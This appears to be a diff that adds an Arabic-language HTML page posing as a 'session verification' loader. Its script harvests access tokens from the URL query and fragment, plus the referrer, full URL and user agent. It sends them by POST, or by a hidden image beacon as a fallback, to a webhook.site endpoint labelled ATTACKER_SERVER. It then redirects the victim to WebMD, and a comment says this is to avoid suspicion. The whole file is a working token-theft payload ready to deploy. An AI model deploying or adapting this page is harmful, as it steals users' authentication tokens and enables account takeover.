@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>جاري التحقق من الجلسة...</title>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f4f7f9; margin: 0; }
+        .loader-container { text-align: center; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        p { color: #555; font-size: 18px; }
+    </style>
+</head>
+<body>
+
+<div class="loader-container">
+    <div class="loader"></div>
+    <p>جاري إعادة توجيهك بأمان، يرجى الانتظار لحظة...</p>
+</div>
+
+<script>
+    (function() {
+        // 1. إعدادات السيرفر الخاص بك (تغيير هذا الرابط لرابط الـ RequestBin أو سيرفرك)
+        const ATTACKER_SERVER = "https://webhook.site/3c9c39db-b0cd-4f1d-8dab-8b1908b5b0db/log";
+
+        // 2. محاولة سحب البيانات من الـ URL (Fragment # أو Query ?)
+        const urlParams = new URLSearchParams(window.location.search);
+        const hashParams = new URLSearchParams(window.location.hash.substring(1));
+        
+        // البحث عن التوكن بمسميات مختلفة (accessToken, token, id_token)
+        const token = hashParams.get('access_token') || hashParams.get('token') || 
+                      urlParams.get('access_token') || urlParams.get('token') ||
+                      urlParams.get('z'); // أحياناً يستخدمون رموزاً مختصرة
+
+        // 3. جمع معلومات إضافية (RefererHeader)
+        const referer = document.referrer;
+
+        // 4. إرسال البيانات فوراً للسيرفر
+        if (token || referer) {
+            fetch(ATTACKER_SERVER, {
+                method: 'POST',
+                mode: 'no-cors', // لضمان الإرسال حتى لو لم تكن هناك إعدادات CORS
+                body: JSON.stringify({
+                    captured_token: token,
+                    full_url: window.location.href,
+                    referer_info: referer,
+                    user_agent: navigator.userAgent,
+                    timestamp: new Date().toISOString()
+                })
+            }).then(() => {
+                // 5. بعد الإرسال، إعادة توجيه المستخدم لصفحة WebMD الحقيقية لتقليل الشكوك
+                setTimeout(() => {
+                    window.location.href = "https://www.webmd.com/";
+                }, 1500);
+            }).catch(() => {
+                // في حال فشل fetch، نستخدم صورة مخفية كخطة بديلة (Image Beacon)
+                const img = new Image();
+                img.src = `${ATTACKER_SERVER}?token=${token}&ref=${btoa(referer)}`;
+                window.location.href = "https://www.webmd.com/";
+            });
+        } else {
+            // إذا لم نجد شيئاً، نعيده للموقع أيضاً
+            setTimeout(() => { window.location.href = "https://www.webmd.com/"; }, 2000);
+        }
+    })();
+</script>
+
+</body>
+</html>
